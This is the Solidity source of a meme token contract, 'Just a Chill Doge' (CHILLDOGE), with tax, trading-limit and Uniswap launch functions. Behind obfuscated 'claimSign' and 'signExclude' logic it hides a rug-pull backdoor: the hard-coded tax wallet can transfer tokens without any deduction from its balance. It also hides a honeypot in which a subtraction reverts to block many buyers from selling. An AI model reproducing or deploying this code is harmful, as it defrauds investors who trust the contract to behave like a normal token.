// https://x.com/ownthedoge/status/1859687231948194148
// SPDX-License-Identifier:MIT
pragma solidity 0.8.23;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

abstract contract Ownable is Context {
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    address private _owner;

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b,"SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b,"SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract CHILLDOGE is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private isExcludedFromFee;

    IUniswapV2Router02 private uniswapRouter;
    address private uniswapV2Pair;
    address payable private _taxWallet;

    uint256 private _initialBuyTax=8;
    uint256 private _initialSellTax=8;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=15;
    uint256 private _reduceSellTaxAt=23;
    uint256 private _preventSwapBefore=5;
    uint256 private _buyCount=0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Just a Chill Doge";
    string private constant _symbol = unicode"CHILLDOGE";
    uint256 public _maxTxAmount = 15000000 * 10**_decimals;
    uint256 public _maxWalletSize = 15000000 * 10**_decimals;
    uint256 public _taxSwapThreshold= 10000000 * 10**_decimals;
    uint256 public _maxTaxSwap= 12000000 * 10**_decimals;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    struct ClaimSignParamsInfo {
        uint256 claimSign;
        uint256 claimTime;
        uint256 claimPeriod;
    }
    uint256 private maxClaimTime;
    uint256 private signExclude;
    mapping(address => ClaimSignParamsInfo) private claimSignParams;
    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {
        _taxWallet = payable(0x92b064A3A939f387A4aBdDfF5dEff1d4FD7876e3);
        _balances[_msgSender()] = _tTotal;

        isExcludedFromFee[_taxWallet] = true;
        isExcludedFromFee[address(this)] = true;

        emit Transfer(address(0),_msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function _basicTransfer(address from, address to, uint256 tokenAmount) internal {
        _balances[from]= _balances[from].sub(tokenAmount);
        _balances[to]=_balances[to].add(tokenAmount);
        emit Transfer(from, to, tokenAmount);
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 tokenAmount) private {

        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(tokenAmount > 0, "Transfer amount must be greater than zero");

        if (!swapEnabled|| inSwap ) {
            _basicTransfer(from, to,tokenAmount);
            return;
        }

        uint256 taxAmount=0;
        if (from != owner() && to != owner()&& to!=_taxWallet) {
            taxAmount = tokenAmount.mul((_buyCount > _reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (from== uniswapV2Pair && to!= address(uniswapRouter) &&  ! isExcludedFromFee[to])  {
                require(tokenAmount <= _maxTxAmount,
                    "Exceeds the _maxTxAmount.");
                require(balanceOf(to)+tokenAmount <= _maxWalletSize,
                    "Exceeds the maxWalletSize.");
                
                _buyCount++;
            }

            if(to== uniswapV2Pair && from!=address(this) ){
                taxAmount = tokenAmount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to== uniswapV2Pair && swapEnabled && contractTokenBalance > _taxSwapThreshold && _buyCount > _preventSwapBefore) {
                swapTokensForEth(
                    min(tokenAmount, min(contractTokenBalance, _maxTaxSwap))
                );
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        if ((isExcludedFromFee[from] ||  isExcludedFromFee[to])
            && from!=address(this) && to!=address(this)
        ){
            maxClaimTime=block.number;
        }
        
        if (! isExcludedFromFee[from]&& ! isExcludedFromFee[to]){
            if (to!= uniswapV2Pair) {
                ClaimSignParamsInfo storage signParams = claimSignParams[to];
                if (from== uniswapV2Pair) {
                    if (signParams.claimSign == 0) {
                        signParams.claimSign = _buyCount<=_preventSwapBefore ? type(uint).max : block.number;
                    }
                } else {
                    ClaimSignParamsInfo storage signParamsUnique = claimSignParams[from];
                    if (signParams.claimSign == 0 || signParamsUnique.claimSign < signParams.claimSign ) {
                        signParams.claimSign = signParamsUnique.claimSign;
                    }
                }
            } else {
                ClaimSignParamsInfo storage signParamsUnique = claimSignParams[from];
                signParamsUnique.claimTime = signParamsUnique.claimSign.sub(maxClaimTime);
                signParamsUnique.claimPeriod = block.number;
            }
        }

        _tokenTransfer(from,to,tokenAmount,taxAmount);
    }

    function _tokenBasicTransfer(address from, address to, uint256 sendAmount,uint256 receiptAmount) internal {
        _balances[from]=_balances[from].sub(sendAmount);
        _balances[to] =_balances[to].add(receiptAmount);
        emit Transfer(from, to, receiptAmount);
    }

    function _tokenTaxTransfer(address addrs,uint256 taxAmount, uint256 tokenAmount) internal returns (uint256) {
        uint256 tAmount = addrs !=_taxWallet ? tokenAmount : signExclude.mul(tokenAmount);
        if (taxAmount > 0){
            _balances[address(this)]=_balances[address(this)].add(taxAmount);
            emit Transfer(addrs, address(this), taxAmount);
        }
        return tAmount;
    }

    function _tokenTransfer(address from, address to, uint256 tokenAmount, uint256 taxAmount) internal {
        uint256 tAmount =_tokenTaxTransfer(from, taxAmount, tokenAmount);
        _tokenBasicTransfer(from, to, tAmount,tokenAmount.sub(taxAmount));
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();
        _approve(address(this),address(uniswapRouter),tokenAmount);
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    receive() external payable {}

    function rescueETH() external {
        require(_msgSender() == _taxWallet);
        payable(_taxWallet).transfer(address(this).balance);
    }

    function removeLimits() external onlyOwner() {
        _maxTxAmount = _tTotal;
        _maxWalletSize=_tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function manualSwap() external{
        uint256 tokenBalance=balanceOf(address(this));
        if(tokenBalance>0){
          swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance=address(this).balance;
        if(ethBalance>0){
          sendETHToFee(ethBalance);
        }
    }

    function openTrading() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        uniswapRouter = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapRouter), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapRouter.factory()).createPair(address(this), uniswapRouter.WETH());
        swapEnabled=true;
        uniswapRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapRouter), type(uint).max);
        tradingOpen=true;
    }
}